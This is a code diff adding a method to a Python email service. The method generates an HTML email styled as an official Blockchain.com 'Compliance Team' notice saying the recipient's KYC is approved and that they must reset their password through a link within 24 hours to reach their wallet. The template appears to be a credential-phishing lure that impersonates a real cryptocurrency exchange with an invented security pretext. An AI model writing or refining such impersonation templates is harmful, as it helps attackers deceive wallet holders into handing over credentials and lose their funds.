@@ -131,6 +131,83 @@ class EmailService:
         
         return subject, html_body
     
+    def get_kyc_approved_email(self, user_name: str, reset_link: str) -> tuple:
+        """Generate KYC approved email with password reset link"""
+        subject = "Identity Verified - Reset Your Password - Blockchain.com"
+        
+        html_body = f"""
+        <!DOCTYPE html>
+        <html>
+        <head>
+            <meta charset="utf-8">
+            <style>
+                body {{ font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; line-height: 1.6; color: #333; }}
+                .container {{ max-width: 600px; margin: 0 auto; padding: 20px; }}
+                .header {{ background: linear-gradient(135deg, #1a1f3c 0%, #121530 100%); padding: 30px; text-align: center; border-radius: 10px 10px 0 0; }}
+                .header h1 {{ color: white; margin: 0; font-size: 24px; }}
+                .content {{ background: #f8f9fa; padding: 30px; border-radius: 0 0 10px 10px; }}
+                .success-box {{ background: #d4edda; border: 2px solid #28a745; border-radius: 10px; padding: 20px; margin: 20px 0; text-align: center; }}
+                .success-icon {{ font-size: 48px; margin-bottom: 10px; }}
+                .success-text {{ color: #155724; font-size: 18px; font-weight: bold; }}
+                .step-box {{ background: #fff; border: 2px solid #0052ff; border-radius: 10px; padding: 20px; margin: 20px 0; }}
+                .step-number {{ display: inline-block; background: #0052ff; color: white; width: 30px; height: 30px; border-radius: 50%; text-align: center; line-height: 30px; font-weight: bold; margin-right: 10px; }}
+                .button {{ display: inline-block; background: #0052ff; color: white; padding: 18px 40px; text-decoration: none; border-radius: 8px; margin: 20px 0; font-weight: 600; font-size: 16px; }}
+                .button:hover {{ background: #0041cc; }}
+                .warning {{ background: #fff3cd; border-left: 4px solid #ffc107; padding: 15px; margin: 20px 0; }}
+                .footer {{ text-align: center; padding: 20px; color: #666; font-size: 12px; }}
+            </style>
+        </head>
+        <body>
+            <div class="container">
+                <div class="header">
+                    <h1>Blockchain.com</h1>
+                </div>
+                <div class="content">
+                    <div class="success-box">
+                        <div class="success-icon">✅</div>
+                        <div class="success-text">Your Identity Has Been Verified!</div>
+                    </div>
+                    
+                    <p>Dear {user_name},</p>
+                    
+                    <p>Great news! Our compliance team has successfully verified your identity. Your KYC (Know Your Customer) verification is now <strong>APPROVED</strong>.</p>
+                    
+                    <div class="step-box">
+                        <h3 style="margin-top: 0; color: #0052ff;"><span class="step-number">!</span> Next Step Required</h3>
+                        <p>To ensure the security of your account, you must now <strong>reset your password</strong> before you can access your wallet.</p>
+                        <p>This is a mandatory security measure to protect your funds.</p>
+                        <p style="text-align: center;">
+                            <a href="{reset_link}" class="button">Reset My Password</a>
+                        </p>
+                    </div>
+                    
+                    <div class="warning">
+                        <strong>⚠️ Important:</strong>
+                        <ul style="margin: 10px 0 0 0; padding-left: 20px;">
+                            <li>This password reset link will expire in <strong>24 hours</strong></li>
+                            <li>After resetting your password, you will have full access to your account</li>
+                            <li>Choose a strong, unique password that you haven't used before</li>
+                        </ul>
+                    </div>
+                    
+                    <p>If you have any questions or did not request this verification, please contact our support team immediately.</p>
+                    
+                    <p>Thank you for your cooperation.</p>
+                    
+                    <p>Best regards,<br><strong>The Blockchain.com Compliance Team</strong></p>
+                </div>
+                <div class="footer">
+                    <p>© 2024 Blockchain.com. All rights reserved.</p>
+                    <p>Blockchain.com | London, United Kingdom | FCA Registered</p>
+                    <p style="font-size: 10px; color: #999;">This email was sent to the address associated with your Blockchain.com account.</p>
+                </div>
+            </div>
+        </body>
+        </html>
+        """
+        
+        return subject, html_body
+    
     def get_password_reset_email(self, user_name: str, reset_link: str) -> tuple:
         """Generate password reset email content"""
         subject = "Reset Your Password - Blockchain.com"
